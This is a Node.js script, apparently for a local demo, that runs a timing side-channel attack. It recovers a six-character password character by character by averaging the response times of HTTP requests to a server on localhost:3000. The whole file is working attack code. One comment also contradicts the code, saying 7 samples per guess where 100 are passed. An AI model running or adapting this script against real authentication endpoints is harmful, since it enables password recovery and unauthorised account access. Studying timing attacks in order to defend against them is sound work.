// attacker.js
const axios = require('axios');

// Character set and expected password length
const charset = 'abcdefghijklmnopqrstuvwxyz0123456789@!#$%^&*';
const targetLength = 6;
let guessed = '';

// Send a request and measure time taken
async function timeGuess(guess) {
  const start = process.hrtime.bigint();
  try {
    await axios.get(`http://localhost:3000/?guess=${guess}`);
  } catch (_) {
    // Ignore errors (403 expected)
  }
  const end = process.hrtime.bigint();
  return Number(end - start); // nanoseconds
}

// Try multiple times and average the result
async function averageTimeGuess(guess, rounds = 7) {
  let total = 0;
  for (let i = 0; i < rounds; i++) {
    total += await timeGuess(guess);
  }
  return total / rounds;
}

// Main attack logic
(async () => {
  console.log(`🚀 Starting improved timing attack...`);

  while (guessed.length < targetLength) {
    let maxTime = 0;
    let nextChar = '';

    for (const c of charset) {
      const attempt = guessed + c + 'a'.repeat(targetLength - guessed.length - 1);
      const time = await averageTimeGuess(attempt, 100); // try 7 samples per guess

      console.log(`⏱️ Trying: ${attempt} | Avg Time: ${Math.round(time / 1e6)} ms`);

      if (time > maxTime) {
        maxTime = time;
        nextChar = c;
      }
    }

    guessed += nextChar;
    console.log(`✅ Partial guess: ${guessed}`);
  }

  console.log(`🎯 Final password guess: ${guessed}`);
})();
